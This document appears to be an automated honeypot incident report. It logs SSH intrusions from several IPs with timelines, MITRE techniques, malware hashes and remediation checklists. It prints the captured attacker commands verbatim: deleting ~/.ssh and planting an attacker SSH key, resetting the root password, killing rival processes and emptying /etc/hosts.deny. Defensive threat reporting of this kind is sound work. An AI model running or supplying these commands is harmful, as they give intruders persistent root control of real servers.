| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:04:08` | `cowrie.session.connect` |
| `2026-04-08 07:04:08` | `cowrie.client.version` |
| `2026-04-08 07:04:10` | `cowrie.client.kex` |
| `2026-04-08 07:04:11` | `cowrie.login.success` |
| `2026-04-08 07:04:11` | `cowrie.session.params` |
| `2026-04-08 07:04:11` | `cowrie.command.input` |
| `2026-04-08 07:04:11` | `cowrie.command.failed` |
| `2026-04-08 07:04:11` | `cowrie.log.closed` |
| `2026-04-08 07:04:11` | `cowrie.session.params` |
| `2026-04-08 07:04:11` | `cowrie.command.input` |
| `2026-04-08 07:04:11` | `cowrie.session.file_download` |
| `2026-04-08 07:04:11` | `cowrie.log.closed` |
| `2026-04-08 07:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58964cd818eb

| Field | Detail |
|---|---|
| **Source IP** | `45.78.194[.]186` |
| **First Seen** | 2026-04-08 07:04 |
| **Last Seen** | 2026-04-08 07:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:04:15` | `cowrie.session.connect` |
| `2026-04-08 07:04:15` | `cowrie.client.version` |
| `2026-04-08 07:04:15` | `cowrie.client.kex` |
| `2026-04-08 07:04:18` | `cowrie.login.success` |
| `2026-04-08 07:04:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.194[.]186` to AbuseIPDB if not already reported
- [ ] Block `45.78.194[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b542b042f512

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:05 |
| **Last Seen** | 2026-04-08 07:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:05:56` | `cowrie.session.connect` |
| `2026-04-08 07:05:56` | `cowrie.client.version` |
| `2026-04-08 07:05:56` | `cowrie.client.kex` |
| `2026-04-08 07:05:57` | `cowrie.login.success` |
| `2026-04-08 07:05:57` | `cowrie.session.params` |
| `2026-04-08 07:05:57` | `cowrie.command.input` |
| `2026-04-08 07:05:57` | `cowrie.command.failed` |
| `2026-04-08 07:05:58` | `cowrie.log.closed` |
| `2026-04-08 07:05:58` | `cowrie.session.params` |
| `2026-04-08 07:05:58` | `cowrie.command.input` |
| `2026-04-08 07:05:58` | `cowrie.session.file_download` |
| `2026-04-08 07:05:58` | `cowrie.log.closed` |
| `2026-04-08 07:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37251a8c7f68

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:06 |
| **Last Seen** | 2026-04-08 07:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:06:01` | `cowrie.session.connect` |
| `2026-04-08 07:06:01` | `cowrie.client.version` |
| `2026-04-08 07:06:02` | `cowrie.client.kex` |
| `2026-04-08 07:06:03` | `cowrie.login.success` |
| `2026-04-08 07:06:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c89dd8352bc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.37[.]34` |
| **First Seen** | 2026-04-08 07:06 |
| **Last Seen** | 2026-04-08 07:07 |
| **Session Duration** | 64s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:qahLWkmPM43p"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:06:02` | `cowrie.session.connect` |
| `2026-04-08 07:06:02` | `cowrie.client.version` |
| `2026-04-08 07:06:03` | `cowrie.client.kex` |
| `2026-04-08 07:06:04` | `cowrie.login.success` |
| `2026-04-08 07:06:04` | `cowrie.session.params` |
| `2026-04-08 07:06:04` | `cowrie.command.input` |
| `2026-04-08 07:06:04` | `cowrie.command.failed` |
| `2026-04-08 07:06:04` | `cowrie.log.closed` |
| `2026-04-08 07:06:04` | `cowrie.session.params` |
| `2026-04-08 07:06:04` | `cowrie.command.input` |
| `2026-04-08 07:06:05` | `cowrie.session.file_download` |
| `2026-04-08 07:06:05` | `cowrie.log.closed` |
| `2026-04-08 07:06:17` | `cowrie.session.params` |
| `2026-04-08 07:06:17` | `cowrie.command.input` |
| `2026-04-08 07:06:17` | `cowrie.log.closed` |
| `2026-04-08 07:06:18` | `cowrie.session.params` |
| `2026-04-08 07:06:18` | `cowrie.command.input` |
| `2026-04-08 07:06:18` | `cowrie.log.closed` |
| `2026-04-08 07:06:18` | `cowrie.session.params` |
| `2026-04-08 07:06:18` | `cowrie.command.input` |
| `2026-04-08 07:06:19` | `cowrie.session.file_download` |
| `2026-04-08 07:06:19` | `cowrie.log.closed` |
| `2026-04-08 07:06:19` | `cowrie.session.params` |
| `2026-04-08 07:06:19` | `cowrie.command.input` |
| `2026-04-08 07:06:19` | `cowrie.log.closed` |
| `2026-04-08 07:06:19` | `cowrie.session.params` |
| `2026-04-08 07:06:19` | `cowrie.command.input` |
| `2026-04-08 07:06:20` | `cowrie.log.closed` |
| `2026-04-08 07:06:20` | `cowrie.session.params` |
| `2026-04-08 07:06:20` | `cowrie.command.input` |
| `2026-04-08 07:06:20` | `cowrie.command.input` |
| `2026-04-08 07:06:20` | `cowrie.log.closed` |
| `2026-04-08 07:06:21` | `cowrie.session.params` |
| `2026-04-08 07:06:21` | `cowrie.command.input` |
| `2026-04-08 07:06:21` | `cowrie.log.closed` |
| `2026-04-08 07:06:21` | `cowrie.session.params` |
| `2026-04-08 07:06:21` | `cowrie.command.input` |
| `2026-04-08 07:06:21` | `cowrie.log.closed` |
| `2026-04-08 07:07:06` | `cowrie.session.params` |
| `2026-04-08 07:07:06` | `cowrie.command.input` |
| `2026-04-08 07:07:06` | `cowrie.log.closed` |
| `2026-04-08 07:07:07` | `cowrie.session.params` |
| `2026-04-08 07:07:07` | `cowrie.command.input` |
| `2026-04-08 07:07:07` | `cowrie.log.closed` |
| `2026-04-08 07:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.37[.]34` to AbuseIPDB if not already reported
- [ ] Block `14.103.37[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f5b11bad34

| Field | Detail |
|---|---|
| **Source IP** | `14.103.37[.]34` |
| **First Seen** | 2026-04-08 07:07 |
| **Last Seen** | 2026-04-08 07:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:07:10` | `cowrie.session.connect` |
| `2026-04-08 07:07:10` | `cowrie.client.version` |
| `2026-04-08 07:07:10` | `cowrie.client.kex` |
| `2026-04-08 07:07:12` | `cowrie.login.success` |
| `2026-04-08 07:07:13` | `cowrie.session.params` |
| `2026-04-08 07:07:13` | `cowrie.command.input` |
| `2026-04-08 07:07:13` | `cowrie.command.failed` |
| `2026-04-08 07:07:13` | `cowrie.log.closed` |
| `2026-04-08 07:07:13` | `cowrie.session.params` |
| `2026-04-08 07:07:13` | `cowrie.command.input` |
| `2026-04-08 07:07:14` | `cowrie.session.file_download` |
| `2026-04-08 07:07:14` | `cowrie.log.closed` |
| `2026-04-08 07:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.37[.]34` to AbuseIPDB if not already reported
- [ ] Block `14.103.37[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5660c6087207

| Field | Detail |
|---|---|
| **Source IP** | `14.103.37[.]34` |
| **First Seen** | 2026-04-08 07:07 |
| **Last Seen** | 2026-04-08 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:07:17` | `cowrie.session.connect` |
| `2026-04-08 07:07:17` | `cowrie.client.version` |
| `2026-04-08 07:07:17` | `cowrie.client.kex` |
| `2026-04-08 07:07:18` | `cowrie.login.success` |
| `2026-04-08 07:07:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.37[.]34` to AbuseIPDB if not already reported
- [ ] Block `14.103.37[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952771244f26

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:07 |
| **Last Seen** | 2026-04-08 07:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:07:52` | `cowrie.session.connect` |
| `2026-04-08 07:07:52` | `cowrie.client.version` |
| `2026-04-08 07:07:52` | `cowrie.client.kex` |
| `2026-04-08 07:07:53` | `cowrie.login.success` |
| `2026-04-08 07:07:54` | `cowrie.session.params` |
| `2026-04-08 07:07:54` | `cowrie.command.input` |
| `2026-04-08 07:07:54` | `cowrie.command.failed` |
| `2026-04-08 07:07:54` | `cowrie.log.closed` |
| `2026-04-08 07:07:54` | `cowrie.session.params` |
| `2026-04-08 07:07:54` | `cowrie.command.input` |
| `2026-04-08 07:07:55` | `cowrie.session.file_download` |
| `2026-04-08 07:07:55` | `cowrie.log.closed` |
| `2026-04-08 07:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d414734eadf

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:07 |
| **Last Seen** | 2026-04-08 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:07:58` | `cowrie.session.connect` |
| `2026-04-08 07:07:58` | `cowrie.client.version` |
| `2026-04-08 07:07:58` | `cowrie.client.kex` |
| `2026-04-08 07:07:59` | `cowrie.login.success` |
| `2026-04-08 07:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d072ef9196cb

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:13 |
| **Last Seen** | 2026-04-08 07:13 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:13:15` | `cowrie.session.connect` |
| `2026-04-08 07:13:15` | `cowrie.client.version` |
| `2026-04-08 07:13:16` | `cowrie.client.kex` |
| `2026-04-08 07:13:17` | `cowrie.login.success` |
| `2026-04-08 07:13:17` | `cowrie.session.params` |
| `2026-04-08 07:13:17` | `cowrie.command.input` |
| `2026-04-08 07:13:17` | `cowrie.command.failed` |
| `2026-04-08 07:13:17` | `cowrie.log.closed` |
| `2026-04-08 07:13:18` | `cowrie.session.params` |
| `2026-04-08 07:13:18` | `cowrie.command.input` |
| `2026-04-08 07:13:18` | `cowrie.session.file_download` |
| `2026-04-08 07:13:18` | `cowrie.log.closed` |
| `2026-04-08 07:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35fd6f23b8b

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:13 |
| **Last Seen** | 2026-04-08 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:13:21` | `cowrie.session.connect` |
| `2026-04-08 07:13:21` | `cowrie.client.version` |
| `2026-04-08 07:13:21` | `cowrie.client.kex` |
| `2026-04-08 07:13:22` | `cowrie.login.success` |
| `2026-04-08 07:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a07edd0c11c

| Field | Detail |
|---|---|
| **Source IP** | `14.103.37[.]34` |
| **First Seen** | 2026-04-08 07:13 |
| **Last Seen** | 2026-04-08 07:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:13:55` | `cowrie.session.connect` |
| `2026-04-08 07:13:55` | `cowrie.client.version` |
| `2026-04-08 07:13:55` | `cowrie.client.kex` |
| `2026-04-08 07:13:56` | `cowrie.login.success` |
| `2026-04-08 07:13:57` | `cowrie.session.params` |
| `2026-04-08 07:13:57` | `cowrie.command.input` |
| `2026-04-08 07:13:57` | `cowrie.command.failed` |
| `2026-04-08 07:13:57` | `cowrie.log.closed` |
| `2026-04-08 07:13:57` | `cowrie.session.params` |
| `2026-04-08 07:13:57` | `cowrie.command.input` |
| `2026-04-08 07:13:58` | `cowrie.session.file_download` |
| `2026-04-08 07:13:58` | `cowrie.log.closed` |
| `2026-04-08 07:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.37[.]34` to AbuseIPDB if not already reported
- [ ] Block `14.103.37[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4596044a61fd

| Field | Detail |
|---|---|
| **Source IP** | `14.103.37[.]34` |
| **First Seen** | 2026-04-08 07:14 |
| **Last Seen** | 2026-04-08 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:14:03` | `cowrie.session.connect` |
| `2026-04-08 07:14:04` | `cowrie.client.version` |
| `2026-04-08 07:14:04` | `cowrie.client.kex` |
| `2026-04-08 07:14:05` | `cowrie.login.success` |
| `2026-04-08 07:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.37[.]34` to AbuseIPDB if not already reported
- [ ] Block `14.103.37[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89f29dfe4403

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 07:15 |
| **Last Seen** | 2026-04-08 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 07:15:08` | `cowrie.session.connect` |
| `2026-04-08 07:15:08` | `cowrie.client.version` |
| `2026-04-08 07:15:08` | `cowrie.client.kex` |
| `2026-04-08 07:15:09` | `cowrie.login.success` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `175.107.205[.]107` | **15** | 2026-04-08 06:56 | 2026-04-08 06:59 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `41.242.115[.]83` | **15** | 2026-04-08 06:44 | 2026-04-08 07:13 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.37[.]34` | **12** | 2026-04-08 06:57 | 2026-04-08 07:14 | 12m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.78.194[.]186` | **5** | 2026-04-08 07:00 | 2026-04-08 07:13 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `69.74.29[.]21` | **3** | 2026-04-08 06:47 | 2026-04-08 06:51 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `1.94.220[.]55` | 1 | 2026-04-08 06:56 | 2026-04-08 06:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.248.158[.]38` | 1 | 2026-04-08 06:02 | 2026-04-08 06:02 | 8s | 0 | `T1592` | 🟢 LOW |
| `120.71.149[.]30` | 1 | 2026-04-08 06:46 | 2026-04-08 06:46 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.213.223[.]121` | 1 | 2026-04-08 06:26 | 2026-04-08 06:26 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.184.36[.]192` | 1 | 2026-04-08 06:47 | 2026-04-08 06:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.80.18[.]158` | 1 | 2026-04-08 07:00 | 2026-04-08 07:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.47.126[.]146` | 1 | 2026-04-08 05:45 | 2026-04-08 05:45 | 14s | 0 | `T1592` | 🟢 LOW |
| `212.88.48[.]17` | 1 | 2026-04-08 07:00 | 2026-04-08 07:00 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.112.78[.]223` | 1 | 2026-04-08 06:59 | 2026-04-08 06:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.134.96[.]76` | 1 | 2026-04-08 06:47 | 2026-04-08 06:49 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
